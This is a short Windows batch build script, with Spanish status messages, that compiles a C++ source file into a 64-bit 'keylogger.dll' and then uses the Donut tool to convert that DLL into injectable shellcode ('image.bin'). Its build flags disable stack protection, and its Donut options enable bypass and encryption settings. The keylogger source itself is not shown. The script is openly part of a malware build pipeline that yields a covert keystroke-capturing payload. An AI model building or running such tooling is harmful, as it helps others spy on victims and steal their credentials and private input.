@echo off
setlocal

echo ============================================
echo  [1/2] Compilando keylogger.dll (x64) con /MD...
echo ============================================

cl /nologo /MD /O2 /GS- /EHs-c- /DNDEBUG /std:c++14 ^
   /LD kl.cpp ^
   /Fe:keylogger.dll ^
   /Fo:obj\ ^
   /link user32.lib gdi32.lib gdiplus.lib winhttp.lib shlwapi.lib ole32.lib advapi32.lib

if errorlevel 1 (
    echo.
    echo [X] ERROR compilando.
    exit /b 1
)

echo.
echo ============================================
echo  [2/2] Generando shellcode con Donut...
echo ============================================
if not exist donut.exe (
    echo [!] donut.exe no esta en esta carpeta. Saltando.
    goto :done
)

donut.exe -i keylogger.dll -o image.bin -a 2 -m Go -b 1 -e 1 -z 1
if errorlevel 1 (
    echo [X] Donut fallo.
    exit /b 1
)

:done
echo.
echo LISTO.
dir /b *.dll *.bin 2>nul
endlocal